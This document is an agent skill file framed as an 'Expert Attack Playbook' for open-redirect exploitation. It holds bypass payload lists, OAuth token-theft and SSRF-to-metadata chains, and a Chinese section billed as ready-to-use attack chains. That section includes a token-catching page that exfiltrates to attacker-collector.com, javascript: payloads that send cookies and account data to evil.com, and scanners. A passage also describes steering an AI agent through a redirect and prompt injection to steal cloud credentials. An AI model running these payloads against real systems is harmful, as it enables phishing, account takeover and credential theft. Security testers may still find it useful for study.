---
name: open-redirect
description: >-
  Open redirect playbook. Use when URL parameters, form actions, or JavaScript sinks control navigation targets and may redirect users to attacker-controlled destinations.
---

# SKILL: Open Redirect — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Open redirect techniques. Covers parameter-based redirects, JavaScript sinks, filter bypass, and chaining with phishing, CSRF Referer bypass, OAuth token theft, and SSRF. Often underrated but critical for phishing and as a building block in multi-step exploit chains.

## 1. CORE CONCEPT

Open redirect occurs when an application redirects users to a URL derived from user input without validation. The trusted domain acts as a "launchpad" for phishing or token theft.

```
https://trusted.com/redirect?url=https://evil.com
→ User sees trusted.com in the link → clicks → lands on evil.com
```

---

## 2. FINDING REDIRECT PARAMETERS

### Common Parameter Names

```text
?url=           ?redirect=      ?next=          ?dest=
?destination=   ?redir=         ?return=        ?returnUrl=
?go=            ?forward=       ?target=        ?out=
?continue=      ?link=          ?view=          ?to=
?ref=           ?callback=      ?path=          ?rurl=
```

### Server-Side Sinks

```
HTTP 301/302 Location header
PHP: header("Location: $input")
Python: redirect(input)
Java: response.sendRedirect(input)
Node: res.redirect(input)
```

### Client-Side (JavaScript) Sinks

```javascript
window.location = input
window.location.href = input
window.location.replace(input)
window.open(input)
document.location = input
```

---

## 3. FILTER BYPASS TECHNIQUES

| Validation | Bypass |
|---|---|
| Checks if URL starts with `/` | `//evil.com` (protocol-relative) |
| Checks domain contains `trusted.com` | `evil.com?trusted.com` or `trusted.com.evil.com` |
| Blocks `http://` | `//evil.com`, `https://evil.com`, `\/\/evil.com` |
| Checks URL starts with `https://trusted.com` | `https://trusted.com@evil.com` (userinfo) |
| Regex `^/[^/]` (relative only) | `/\evil.com` (backslash treated as path in some browsers) |
| Django `endswith('target.com')` | `http://evil.com/www.target.com` — URL path ends with target domain |
| Whitelist by domain suffix | Subdomain takeover on `*.trusted.com` |

```text
# Protocol-relative:
//evil.com

# Userinfo bypass:
https://trusted.com@evil.com

# Backslash trick:
/\evil.com
/\/evil.com

# URL encoding:
https://trusted.com/%2F%2Fevil.com

# Django endswith bypass:
http://evil.com/www.target.com
http://evil.com?target.com

# Trusted site double-redirect (e.g., via Baidu link service):
https://link.target.com/?url=http://evil.com

# Special character confusion:
http://evil.com#@trusted.com        # fragment as authority
http://evil.com?trusted.com         # query string confusion
http://trusted.com%00@evil.com      # null byte truncation

# Tab/newline in URL (browser ignores whitespace):
java%09script:alert(1)
```

---

## 4. EXPLOITATION CHAINS

### Phishing Amplification

Attacker sends: `https://bigbank.com/redirect?url=https://bigbank-login.evil.com`
Victim sees `bigbank.com` → clicks → enters credentials on clone site.

### OAuth Token Theft

If OAuth `redirect_uri` allows open redirect on the authorized domain:
```
/authorize?redirect_uri=https://trusted.com/redirect?url=https://evil.com
→ Authorization code or token appended to evil.com URL
→ Attacker captures token from URL fragment or query
```

### CSRF Referer Bypass

Some CSRF protections check `Referer` header contains trusted domain:
```
1. Attacker page links to: https://trusted.com/redirect?url=https://trusted.com/change-email
2. Redirect preserves Referer from trusted.com
3. CSRF protection passes because Referer = trusted.com
```

### SSRF via Redirect

When server follows redirects:
```
?url=https://test-attacker.com/redirect-to-internal
# test-attacker.com returns 302 → http://169.254.169.254/
# Server follows redirect → SSRF to metadata endpoint
```

---

## 5. TESTING CHECKLIST

```
□ Identify all URL parameters that trigger redirects
□ Test external domain: ?url=https://evil.com
□ Test protocol-relative: ?url=//evil.com
□ Test userinfo bypass: ?url=https://trusted.com@evil.com
□ Test backslash: ?url=/\evil.com
□ Test JavaScript sink: ?url=javascript:alert(1) (DOM-based)
□ Check OAuth flows for redirect_uri open redirect
□ Verify if redirect preserves auth tokens in URL
```

---

## 6. TABNABBING (REVERSE TABNABBING)

### Concept

When a link opens a new tab with `target="_blank"` WITHOUT `rel="noopener"`:

- The new page can access `window.opener`
- It can redirect the ORIGINAL page: `window.opener.location = "https://phishing.com/login"`
- User returns to "original" tab → sees fake login page → enters credentials

### Detection

```html
<!-- Vulnerable: -->
<a href="https://external.com" target="_blank">Click here</a>

<!-- Safe: -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">Click here</a>
```

### Exploitation

```javascript
// On the attacker-controlled page (opened via target="_blank"):
if (window.opener) {
    window.opener.location = "https://phishing.com/fake-login.html";
}
```

### Where to Look

- User-generated content with links (forums, comments, profiles)
- `target="_blank"` links to external domains
- PDF viewers, document previews opening in new tabs

---

## 7. OPEN REDIRECT → OAUTH TOKEN THEFT (DETAILED CHAINS)

### 7.1 OAuth Implicit Flow

In the implicit flow, the access token is returned in the URL fragment (`#access_token=...`). If `redirect_uri` allows an open redirect on the authorized domain:

```text
/authorize?response_type=token
  &client_id=CLIENT
  &redirect_uri=https://target.com/callback/../redirect?url=https://evil.com
  &scope=read

Flow:
1. User authenticates → authorization server redirects to:
   https://target.com/redirect?url=https://evil.com#access_token=SECRET
2. Open redirect fires → browser navigates to:
   https://evil.com#access_token=SECRET
3. Attacker page reads location.hash → captures access token
```

### 7.2 Authorization Code Flow

The authorization code is sent as a query parameter. If the redirect chain preserves query parameters:

```text
/authorize?response_type=code
  &client_id=CLIENT
  &redirect_uri=https://target.com/callback%2f..%2fredirect%3furl%3dhttps://evil.com

Flow:
1. Authorization server validates redirect_uri prefix → matches https://target.com/
2. Redirects to: https://target.com/redirect?url=https://evil.com&code=AUTH_CODE
3. Open redirect sends victim to: https://evil.com?code=AUTH_CODE
4. Attacker exchanges code for access token
```

### 7.3 OIDC id_token Fragment Leak

```text
/authorize?response_type=id_token
  &client_id=CLIENT
  &redirect_uri=https://target.com/cb
  &nonce=NONCE

If redirect_uri points to open redirect endpoint:
→ id_token in fragment sent to attacker
→ Attacker has signed identity assertion
→ Can authenticate as victim on any RP accepting this IdP
```

### 7.4 redirect_uri validation bypass patterns

```text
redirect_uri=https://target.com/callback/../open-redirect?url=evil.com
redirect_uri=https://target.com/callback?next=https://evil.com
redirect_uri=https://target.com/callback%23@evil.com
redirect_uri=https://target.com/callback/../../redirect
redirect_uri=https://target.com/callback#@evil.com
```

---

## 8. OPEN REDIRECT → SSRF CHAIN

### Server-side redirect following

When a server-side component follows HTTP redirects (e.g., URL preview, link unfurler, webhook, image fetcher):

```text
1. Submit URL to server-side fetcher: http://test-attacker.com/redirect
2. test-attacker.com responds: 302 Location: http://169.254.169.254/latest/meta-data/
3. Server follows redirect → SSRF to cloud metadata endpoint
4. Response (IAM credentials) returned to attacker or visible in preview
```

### Multi-hop redirect for filter bypass

```text
1. Server blocks direct requests to 169.254.169.254
2. Submit: http://test-attacker.com/r1
3. r1 → 302 → http://test-attacker.com/r2  (same domain, passes filter)
4. r2 → 302 → http://169.254.169.254/ (internal, filter not re-checked)
```

### DNS rebinding variant

```text
1. test-attacker.com resolves to attacker's public IP (TTL=0)
2. Server resolves test-attacker.com → public IP → passes SSRF filter
3. Connection established, but HTTP redirect points to test-attacker.com again
4. Second DNS resolution: test-attacker.com now resolves to 169.254.169.254
5. Server follows redirect to internal address
```

### Scope escalation via redirect protocols

```text
http://test-attacker.com/redirect → gopher://127.0.0.1:6379/...  (Redis SSRF)
http://test-attacker.com/redirect → file:///etc/passwd            (local file read)
http://test-attacker.com/redirect → dict://127.0.0.1:11211/       (Memcached)
```

Not all HTTP clients follow cross-protocol redirects, but `curl` (default) and some libraries do.

---

## 9. URL PARSER CONFUSION FOR REDIRECT BYPASS

When a redirect validation function parses the URL differently from the browser or server that ultimately processes it:

### Protocol-relative URL

```text
//test-attacker.com
→ Browser: https://test-attacker.com (inherits current page protocol)
→ Some validators: relative path "/test-attacker.com" (wrong)
```

### Backslash confusion

```text
\/\/test-attacker.com
/\/test-attacker.com
→ Many browsers normalize \ to / in URLs
→ Validators treating \ as path character may allow it
```

### Userinfo section abuse

```text
//test-attacker.com\@target.com
→ Browser: navigates to test-attacker.com (@ is userinfo delimiter)
→ Validator sees "target.com" in the string → passes allowlist check

//target.com@test-attacker.com
→ Browser: userinfo=target.com, host=test-attacker.com
→ Validator checks "starts with target.com" → passes

https://target.com%2F@test-attacker.com
→ URL-decoded: target.com/ as userinfo, host=test-attacker.com
```

### Double encoding

```text
//attacker%252ecom
→ First decode: //attacker%2ecom (passes validator)
→ Second decode (by server/browser): //test-attacker.com (actual redirect)
```

### CRLF injection + redirect

```text
/%0d%0aLocation:%20https://test-attacker.com
→ If server reflects the path in a header context:
   HTTP/1.1 302 Found
   Location: /
   Location: https://test-attacker.com  ← injected header wins
```

### Fragment confusion

```text
https://target.com#@test-attacker.com
→ Browser: host=target.com, fragment=@test-attacker.com
→ But some JS-based redirects: window.location = url → may process differently

https://test-attacker.com#.target.com
→ Validator: sees "target.com" in string → passes
→ Browser: navigates to test-attacker.com (fragment ignored in navigation)
```

### Special characters

```text
https://test-attacker.com%E3%80%82target.com
→ Unicode ideographic full stop (U+3002) — some parsers treat as dot
→ Browser may normalize differently than validator

https://attacker。com    (U+3002 fullwidth period)
https://attacker．com    (U+FF0E fullwidth full stop)
```

### Combined URL parser differential table

| Payload | Validator Sees | Browser Navigates To |
|---------|---------------|---------------------|
| `//evil.com` | Relative path | `https://evil.com` |
| `\/\/evil.com` | Path `\/\/evil.com` | `https://evil.com` |
| `//evil.com\@target.com` | Contains `target.com` | `https://evil.com` |
| `//target.com@evil.com` | Starts with `target.com` | `https://evil.com` |
| `/%0d%0aLocation: https://evil.com` | Path string | Header injection → redirect |
| `//evil%252ecom` | `evil%2ecom` (not a domain) | `evil.com` (after double decode) |

---

## 10. 2026 EMERGING TECHNIQUES

### 10.1 OAuth/SSO Chain: Open Redirect → Account Takeover (2026)

Subdomain takeover combined with OAuth callback/SSO redirect creates a full account takeover chain. The 2026 highest-return technique is **CNAME chain resolution**:

```
1. Find dangling subdomain with unresolvable CNAME (e.g., promo.target.com → deleted S3)
2. Claim the CNAME target (create the S3 bucket / Heroku app)
3. Check if the subdomain is in the OAuth redirect_uri allowlist:
   - Does promo.target.com have a parent-domain cookie? (session leak)
   - Does it have MX records? (email-based account recovery hijack)
   - Is it in the OAuth redirect_uri whitelist? (token/code theft)
4. If yes → OAuth code or token delivered to attacker-controlled subdomain
→ Complete account takeover
```

**2026 bounty case**: subdomain takeover ($8,000) + OAuth redirect_uri chain ($12,000 IDOR) = $20,000 total. (cross-link ../subdomain-takeover/SKILL.md)

### 10.2 AI Agent Open Redirect Abuse (2026)

AI agents follow arbitrary URLs without allowlists — an open redirect can chain the agent into SSRF against cloud metadata endpoints:

```
# Agent receives a URL from tool output or prompt:
"Visit https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"

# Agent follows redirect → fetches cloud metadata (IAM credentials)
# Agent then exfiltrates credentials via another tool call or log:

Flow:
1. Open redirect on target.com redirects to 169.254.169.254
2. Agent follows (no URL allowlist) → SSRF to metadata endpoint
3. IAM credentials returned to agent context
4. Prompt injection exfiltrates credentials via outbound tool call
→ Cloud credential theft via open redirect → SSRF chain
```

(cross-link ../ssrf-server-side-request-forgery/SKILL.md and ../ai-llm-attack-surface/SKILL.md)

### 10.3 HTTP/3 Redirect Abuse (2026)

QUIC connection migration and 0-RTT replay bypass session-based redirect restrictions:

```
# Session-based redirect validation:
GET /redirect?url=https://evil.com HTTP/3
→ Server checks session → blocks (redirect not in allowlist)

# 0-RTT replay: capture an earlier request where redirect was allowed:
# Replays the 0-RTT packet → server processes before session re-validation
GET /redirect?url=https://evil.com HTTP/3 (0-RTT replay)
→ Redirect fires, session restriction bypassed

# Connection migration: QUIC migrates IPs mid-connection
# Redirect validation tied to source IP fails after migration
```

### 10.4 Edge Function Redirect Manipulation (2026)

Cloudflare Workers and Vercel Edge Functions process the `Location` header differently from origin servers, enabling redirect_uri validation bypass:

```
# Edge function constructs redirect from untrusted input:
Request: GET /auth?redirect_uri=https://evil.com
Edge Worker code: return Response.redirect(url, 302)
→ Edge normalizes Location: https://evil.com (bypasses origin validation)

# Chained redirect through edge:
redirect_uri=https://target.com/callback?next=https://evil.com
→ Edge validates prefix (target.com) → passes
→ Origin processes ?next= → redirects to evil.com
→ OAuth code appended to evil.com URL
```

### 10.5 Payment Callback Open Redirect (2026)

Payment callback `redirect` parameters are user-controllable and often under-validated. Combined with callback forgery (e.g., dujiaoka-style), this achieves complete payment bypass:

```
# Payment gateway callback:
POST /payment/notify
redirect=https://evil.com&order_id=12345&status=paid

# Attacker manipulates redirect to capture payment confirmation:
1. Initiate payment on target (order #12345)
2. Intercept callback, set redirect=https://evil.com
3. User is redirected to evil.com after "payment complete"
4. Attacker forges a second callback to target (dujiaoka-style):
   POST /payment/notify?order_id=12345&status=paid&sign=FORGED
→ Target marks order as paid without actual payment
→ Complete payment bypass via open redirect + callback forgery
```

(cross-link ../business-logic-vulnerabilities/SKILL.md for payment logic flaws)

### 10.6 2026 Open Redirect Checklist

```
□ Check subdomains with dangling CNAMEs in OAuth redirect_uri allowlist
□ Verify parent-domain cookies on takeover-able subdomains
□ Test AI agent URL following for metadata endpoint SSRF
□ Test HTTP/3 0-RTT replay and connection migration for redirect bypass
□ Test edge function Location header processing vs origin validation
□ Test chained redirects: edge prefix validation → origin ?next= redirect
□ Check payment callback redirect parameters for forgery chains
□ Verify redirect_uri validation is consistent across edge and origin
```

---

## PRACTICAL ATTACK CHAINS (2026)

> 本节提供完整、可立即使用的实战攻击链，每条链包含真实命令、分步利用过程、检测绕过技术与 2026 CVE 引用。所有代码注释均为中文。

---

### 攻击链 1：开放重定向到 OAuth 令牌窃取（redirect_uri 操纵）

**场景**：目标应用使用 OAuth 2.0 进行第三方登录，`redirect_uri` 参数校验不严格，允许在授权域名上存在开放重定向漏洞。攻击者构造恶意 `redirect_uri`，使用户授权后 access_token 或 authorization_code 被重定向到攻击者控制的域名，实现账户接管。

**前置条件**：
- 目标使用 OAuth 2.0 授权码模式或隐式模式
- `redirect_uri` 校验仅检查前缀或域名包含关系，未做精确匹配
- 授权域名上存在开放重定向漏洞（如 `/redirect?url=`）

**分步利用**：

```bash
# === 步骤 1：识别 OAuth 授权端点 ===
# 常见 OAuth 端点
curl -s "http://target.com/.well-known/openid-configuration" | python3 -m json.tool
# 关注 authorization_endpoint 和 token_endpoint

# 探测 OAuth 参数
curl -s -v "http://target.com/auth?client_id=test&redirect_uri=https://target.com/callback&response_type=code" 2>&1 | grep -i "location\|error"

# === 步骤 2：探测 redirect_uri 校验逻辑 ===
# 测试精确匹配
curl -s -v "http://target.com/auth?client_id=CLIENT_ID&redirect_uri=https://evil.com&response_type=code" 2>&1 | grep -i "error\|invalid"
# 预期：拒绝（redirect_uri 不在白名单）

# 测试前缀匹配（仅检查 https://target.com 前缀）
curl -s -v "http://target.com/auth?client_id=CLIENT_ID&redirect_uri=https://target.com.evil.com&response_type=code" 2>&1
# 如果通过 → 前缀校验可绕过

# 测试路径遍历绕过
curl -s -v "http://target.com/auth?client_id=CLIENT_ID&redirect_uri=https://target.com/callback/../redirect?url=https://evil.com&response_type=code" 2>&1

# === 步骤 3：构造 OAuth 令牌窃取攻击链（隐式模式）===
# 隐式模式：access_token 通过 URL fragment 传递
# 攻击 URL（发送给受害者）：
ATTACK_URL="http://target.com/auth?response_type=token&client_id=CLIENT_ID&redirect_uri=https://target.com/callback/../redirect?url=https://evil.com/catch&scope=read"

# 受害者点击后流程：
# 1. 受害者在 target.com 登录并授权
# 2. 授权服务器重定向到: https://target.com/callback/../redirect?url=https://evil.com/catch#access_token=SECRET_TOKEN
# 3. 路径规范化: /callback/../redirect → /redirect
# 4. 开放重定向触发: 重定向到 https://evil.com/catch#access_token=SECRET_TOKEN
# 5. 攻击者的 evil.com 页面通过 JavaScript 读取 location.hash 获取 token

# === 步骤 4：攻击者接收 token 的页面 ===
cat > catch.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head><title>加载中...</title></head>
<body>
<script>
// 从 URL fragment 中提取 access_token
var hash = window.location.hash.substring(1);  // 去掉 #
var params = new URLSearchParams(hash);
var accessToken = params.get('access_token');

if (accessToken) {
    // 将 token 发送到攻击者的收集服务器
    fetch('https://attacker-collector.com/steal?token=' + accessToken)
        .then(function() {
            // 偷完 token 后重定向回合法网站，避免受害者察觉
            window.location = 'https://target.com/dashboard';
        });
} else {
    // 也检查 query 参数（授权码模式）
    var code = new URLSearchParams(window.location.search).get('code');
    if (code) {
        fetch('https://attacker-collector.com/steal?code=' + code)
            .then(function() { window.location = 'https://target.com/dashboard'; });
    }
}
</script>
</body>
</html>
HTMLEOF

# === 步骤 5：构造授权码模式攻击链 ===
# 授权码模式：code 通过 query 参数传递
ATTACK_URL_CODE="http://target.com/auth?response_type=code&client_id=CLIENT_ID&redirect_uri=https://target.com/callback%2f..%2fredirect%3furl%3dhttps://evil.com/catch&scope=read"

# URL 解码后的 redirect_uri:
# https://target.com/callback/../redirect?url=https://evil.com/catch
# 授权服务器校验时看到 https://target.com/ 前缀 → 通过
# 重定向时路径遍历生效 → 开放重定向到 evil.com

# === 步骤 6：利用 redirect_uri 编码绕过 ===
# 变体 A：使用 @ 符号 userinfo 绕过
curl -s -v "http://target.com/auth?client_id=CLIENT_ID&redirect_uri=https://target.com@evil.com&response_type=code"
# 浏览器解析: userinfo=target.com, host=evil.com → 重定向到 evil.com

# 变体 B：使用 # fragment 绕过
curl -s -v "http://target.com/auth?client_id=CLIENT_ID&redirect_uri=https://target.com/callback#@evil.com&response_type=code"

# 变体 C：双重编码绕过
curl -s -v "http://target.com/auth?client_id=CLIENT_ID&redirect_uri=https://target.com/callback%252f..%252fredir&response_type=code"

# === 步骤 7：使用窃取的 token 访问受害者账户 ===
# 使用 access_token 调用 API
curl -s "http://target.com/api/user/profile" \
  -H "Authorization: Bearer STOLEN_ACCESS_TOKEN"

# 使用 authorization_code 换取 token
curl -s -X POST "http://target.com/oauth/token" \
  -d "grant_type=authorization_code" \
  -d "code=STOLEN_CODE" \
  -d "redirect_uri=https://target.com/callback" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET"

# === 步骤 8：自动化 OAuth redirect_uri 漏洞扫描 ===
python3 -c "
import requests
import urllib.parse

target = 'http://target.com/auth'
client_id = 'CLIENT_ID'

# redirect_uri 绕过 payload 矩阵
bypass_payloads = [
    # 前缀匹配绕过
    'https://target.com.evil.com',
    'https://target.com@evil.com',
    'https://target.com/callback/../redirect?url=https://evil.com',
    'https://target.com/callback/../../redirect',
    # fragment 绕过
    'https://target.com#@evil.com',
    'https://target.com/callback#@evil.com',
    # 编码绕过
    'https://target.com%2f..%2fredirect',
    'https://target.com%252f..%252fredirect',
    # 反斜杠绕过
    'https://target.com/\\\\@evil.com',
    'https:/\\\\evil.com',
    # 协议相对
    '//evil.com',
    '/\\\\evil.com',
]

for payload in bypass_payloads:
    params = {
        'response_type': 'code',
        'client_id': client_id,
        'redirect_uri': payload,
        'scope': 'read',
    }
    r = requests.get(target, params=params, allow_redirects=False)
    
    # 检查是否被接受（未返回 redirect_uri 错误）
    if r.status_code in [200, 302] and 'invalid' not in r.text.lower() and 'error' not in r.text.lower():
        print(f'[+] redirect_uri 绕过可能成功: {payload}')
        if 'location' in r.headers:
            print(f'    重定向到: {r.headers[\"location\"]}')
"
```

**检测绕过技术**：
- `redirect_uri` 精确匹配 → 利用路径遍历 `../` 在同域名内到达开放重定向端点
- `redirect_uri` 白名单校验 → 利用 `@` userinfo 使浏览器解析到不同 host
- WAF 检测 `evil.com` → 使用 URL 编码或使用已被接管的子域名（子域名接管）
- 授权服务器校验 fragment → 部分 OAuth 实现不校验 fragment，可利用 `#@evil.com`

---

### 攻击链 2：开放重定向绕过（反斜杠与协议相对 URL）

**场景**：目标应用的开放重定向校验仅检查 URL 是否以 `/` 开头（认为只允许相对路径跳转），或检查是否包含特定域名。利用反斜杠 `\` 和协议相对 URL `//` 的浏览器解析差异绕过校验，重定向到外部恶意域名。

**前置条件**：
- 重定向参数校验逻辑存在解析差异（校验函数与浏览器解析不一致）
- 服务端使用 `window.location` 或 `Location` 头进行跳转

**分步利用**：

```bash
# === 步骤 1：探测重定向校验逻辑 ===
# 测试是否允许外部 URL
curl -s -v "http://target.com/redirect?url=https://evil.com" 2>&1 | grep -i "location\|error"
# 如果被拒绝 → 存在某种校验

# 测试是否仅允许相对路径（以 / 开头）
curl -s -v "http://target.com/redirect?url=/page" 2>&1 | grep "location"
# 如果允许 → 校验逻辑可能检查 url.startswith('/')

# === 步骤 2：协议相对 URL 绕过 ===
# //evil.com 以 / 开头，通过 startsWith('/') 校验
# 但浏览器将 //evil.com 解析为协议相对 URL → 跳转到 https://evil.com
curl -s -v "http://target.com/redirect?url=//evil.com" 2>&1 | grep "location"

# === 步骤 3：反斜杠绕过 ===
# /\evil.com 以 / 开头，通过校验
# 多数浏览器将 \ 规范化为 / → 解析为 //evil.com → 跳转到 evil.com
curl -s -v "http://target.com/redirect?url=/\evil.com" 2>&1 | grep "location"

# 反斜杠变体
curl -s -v "http://target.com/redirect?url=\/\/evil.com" 2>&1 | grep "location"
curl -s -v "http://target.com/redirect?url=/\/evil.com" 2>&1 | grep "location"

# === 步骤 4：域名包含校验绕过 ===
# 如果校验逻辑检查 url.contains('target.com')
# 方法 A：将 target.com 放在查询参数中
curl -s -v "http://target.com/redirect?url=https://evil.com?target.com" 2>&1 | grep "location"
# 方法 B：将 target.com 作为子域名
curl -s -v "http://target.com/redirect?url=https://target.com.evil.com" 2>&1 | grep "location"
# 方法 C：将 target.com 放在路径中
curl -s -v "http://target.com/redirect?url=https://evil.com/target.com" 2>&1 | grep "location"
# 方法 D：使用 @ userinfo
curl -s -v "http://target.com/redirect?url=https://target.com@evil.com" 2>&1 | grep "location"

# === 步骤 5：多种编码组合绕过 ===
# URL 编码 //
curl -s -v "http://target.com/redirect?url=%2f%2fevil.com" 2>&1 | grep "location"

# URL 编码反斜杠
curl -s -v "http://target.com/redirect?url=%2f%5cevil.com" 2>&1 | grep "location"

# 双重编码
curl -s -v "http://target.com/redirect?url=%252f%252fevil.com" 2>&1 | grep "location"

# Unicode 全角字符（某些解析器规范化为 ASCII）
curl -s -v "http://target.com/redirect?url=／／evil.com" 2>&1 | grep "location"

# Tab/换行注入
curl -s -v "http://target.com/redirect?url=//evil.com%09.target.com" 2>&1 | grep "location"
curl -s -v "http://target.com/redirect?url=//evil.com%0d%0a.target.com" 2>&1 | grep "location"

# === 步骤 6：DOM 型开放重定向（JavaScript 跳转）===
# 如果重定向通过 JavaScript 实现：
# window.location = input; 或 location.href = input;
# 以下 payload 在浏览器中执行：

cat > dom_redirect_test.html << 'HTMLEOF'
<!-- 模拟目标的 DOM 型重定向 -->
<script>
// 目标代码（漏洞）:
// var url = new URLSearchParams(location.search).get('url');
// window.location = url;

// 测试 payload 列表
var payloads = [
    '//evil.com',              // 协议相对
    '/\\evil.com',             // 反斜杠
    '\/\/evil.com',            // 混合斜杠
    'https://target.com@evil.com', // userinfo
    'javascript:alert(1)',     // javascript 协议
];

payloads.forEach(function(p) {
    // 创建测试链接
    var a = document.createElement('a');
    a.href = p;
    console.log('Payload: ' + p + ' → 解析为: ' + a.href);
});
</script>
HTMLEOF

# === 步骤 7：自动化开放重定向绕过扫描 ===
python3 -c "
import requests

target = 'http://target.com/redirect'
param = 'url'

# 完整的绕过 payload 矩阵
payloads = [
    # 协议相对 URL
    '//evil.com',
    '///evil.com',
    # 反斜杠变体
    '/\\\\evil.com',
    '/\\\\\\\\evil.com',
    '\\\\/\\\\/evil.com',
    # userinfo 绕过
    'https://target.com@evil.com',
    '//target.com@evil.com',
    'https://target.com%2f@evil.com',
    # 域名包含绕过
    'https://evil.com?target.com',
    'https://evil.com/target.com',
    'https://evil.com#target.com',
    'https://target.com.evil.com',
    # 编码绕过
    '%2f%2fevil.com',
    '%2f%5cevil.com',
    '%252f%252fevil.com',
    # 特殊字符
    'https://evil.com\\\ttarget.com',  # tab
    'https://evil.com\\\ntarget.com',  # 换行
    # 绝对路径 + 遍历
    '/redirect?url=//evil.com',
    # javascript 协议
    'javascript:fetch(\"https://evil.com/?c=\"+document.cookie)',
]

for payload in payloads:
    r = requests.get(target, params={param: payload}, allow_redirects=False)
    
    # 检查是否重定向到外部域名
    location = r.headers.get('location', '')
    if 'evil.com' in location and 'target.com' not in location.replace('evil.com', ''):
        print(f'[+] 重定向绕过成功! payload: {payload}')
        print(f'    Location: {location}')
    elif r.status_code == 200 and 'evil.com' in r.text:
        # DOM 型重定向（在 HTML 中检查）
        print(f'[+] DOM 重定向可能: payload: {payload}')
"
```

**检测绕过技术**：
- 校验 `url.startsWith('/')` → 使用 `//evil.com` 或 `/\evil.com`
- 校验 `url.startsWith('/') && !url.startsWith('//')` → 使用 `/\evil.com`（反斜杠不被 `//` 匹配）
- 校验 `url.contains('target.com')` → 使用 `https://evil.com?target.com` 或 `https://target.com@evil.com`
- WAF 检测 `evil.com` → 使用 IP 地址、十进制 IP（`http://2130706433/`）或十六进制 IP

---

### 攻击链 3：开放重定向到 XSS（javascript: 协议利用）

**场景**：目标应用的重定向参数允许用户控制跳转目标，且在客户端 JavaScript 中使用 `window.location = userInput` 或 `location.href = userInput` 进行跳转。通过注入 `javascript:` 协议 URL，将重定向转化为 XSS，在目标域名上下文中执行任意 JavaScript 代码。

**前置条件**：
- 重定向通过客户端 JavaScript 实现（DOM 型）
- 服务端未过滤 `javascript:` 协议
- 用户输入直接赋值给 `location.href` 或 `window.location`

**分步利用**：

```bash
# === 步骤 1：识别 DOM 型重定向 ===
# 查看页面源码，寻找以下模式：
# window.location = ...
# location.href = ...
# location.replace(...)
# location.assign(...)
# document.location = ...

# 通过开发者工具或源码检查
curl -s "http://target.com/redirect?url=test" | grep -i "location\.\|window\.location\|document\.location"

# === 步骤 2：基础 javascript: 协议注入 ===
# 直接使用 javascript: 协议执行 JS
curl -s "http://target.com/redirect?url=javascript:alert(document.domain)"

# 带参数的 JS 执行
curl -s "http://target.com/redirect?url=javascript:alert(document.cookie)"

# === 步骤 3：绕过 javascript: 过滤 ===
# 如果目标过滤 "javascript:" 关键字：

# 变体 A：大小写混淆
curl -s "http://target.com/redirect?url=JavaScript:alert(1)"
curl -s "http://target.com/redirect?url=JAVASCRIPT:alert(1)"
curl -s "http://target.com/redirect?url=JaVaScRiPt:alert(1)"

# 变体 B：Tab/换行/回车绕过（浏览器忽略这些字符）
curl -s "http://target.com/redirect?url=java%09script:alert(1)"
curl -s "http://target.com/redirect?url=java%0ascript:alert(1)"
curl -s "http://target.com/redirect?url=java%0dscript:alert(1)"
curl -s "http://target.com/redirect?url=java%0a%09script:alert(1)"

# 变体 C：前导空格/控制字符
curl -s "http://target.com/redirect?url=%20javascript:alert(1)"
curl -s "http://target.com/redirect?url=\x01javascript:alert(1)"

# 变体 D：HTML 实体编码（在 HTML 属性上下文中）
curl -s "http://target.com/redirect?url=javascript&colon;alert(1)"
curl -s "http://target.com/redirect?url=&#106;avascript:alert(1)"

# 变体 E：利用全局变量覆盖
curl -s "http://target.com/redirect?url=javascript:window.name"

# === 步骤 4：窃取 Cookie 的完整 XSS payload ===
# 使用 javascript: 协议执行 cookie 窃取
PAYLOAD='javascript:fetch(\"https://evil.com/steal?c=\"+document.cookie)'

# URL 编码后发送
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
curl -s "http://target.com/redirect?url=${ENCODED}"

# 受害者点击链接后：
# 1. 浏览器执行 javascript:fetch("https://evil.com/steal?c="+document.cookie)
# 2. Cookie 被发送到攻击者服务器
# 3. 在 target.com 域名上下文执行 → 可访问 HttpOnly=false 的 Cookie

# === 步骤 5：利用 window.name 进行跨域数据传递 ===
# 攻击者页面先设置 window.name，然后跳转到目标的重定向页面
cat > attacker.html << 'HTMLEOF'
<script>
// 设置 window.name 为恶意 payload
window.name = 'alert(document.cookie)';

// 跳转到目标的开放重定向，使用 javascript: 协议
// 利用 window.name 在页面跳转后保持不变的特性
window.location = 'http://target.com/redirect?url=javascript:eval(window.name)';
</script>
HTMLEOF

# === 步骤 6：从 XSS 升级到账号接管 ===
# 结合 javascript: XSS 执行更复杂的攻击
# Payload: 窃取 CSRF token 并修改账户邮箱
PAYLOAD='javascript:fetch("/api/account/email",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"email=attacker@evil.com&csrf="+document.querySelector("[name=csrf]").value}).then(r=>r.text()).then(t=>fetch("https://evil.com/exfil?d="+btoa(t)))'

# === 步骤 7：自动化 javascript: XSS 检测 ===
python3 -c "
import requests
import urllib.parse

target = 'http://target.com/redirect'
param = 'url'

# javascript: 协议绕过 payload
payloads = [
    'javascript:alert(1)',
    'JavaScript:alert(1)',
    'JAVASCRIPT:alert(1)',
    'java%09script:alert(1)',
    'java%0ascript:alert(1)',
    'java%0dscript:alert(1)',
    'java%0a%09script:alert(1)',
    '%20javascript:alert(1)',
    'javascript%3aalert(1)',
    'javascript%00:alert(1)',
    # 组合绕过
    'JaVa%09ScRiPt:alert(1)',
    '/javascript:alert(1)',
    '\\\\javascript:alert(1)',
]

for payload in payloads:
    # 发送请求，不跟随重定向
    r = requests.get(target, params={param: payload}, allow_redirects=False)
    
    # 检查响应中是否包含 javascript: payload（DOM 型）
    if 'javascript' in r.text.lower() and 'alert' in r.text:
        print(f'[+] 可能存在 javascript: XSS: {payload}')
    
    # 检查 Location 头（服务端重定向）
    location = r.headers.get('location', '')
    if 'javascript' in location.lower():
        print(f'[+] Location 头包含 javascript: {payload}')
        print(f'    Location: {location}')
"
```

**检测绕过技术**：
- 过滤 `javascript:` → 使用 `JavaScript:`、`java%09script:` 或 `java%0ascript:` 绕过
- 过滤 `alert` → 使用 `confirm`、`prompt`、`eval` 或 `fetch` 替代
- CSP 限制内联脚本 → 利用 `javascript:` 协议在 URL 上下文执行（部分 CSP 配置不覆盖 `javascript:` 协议）
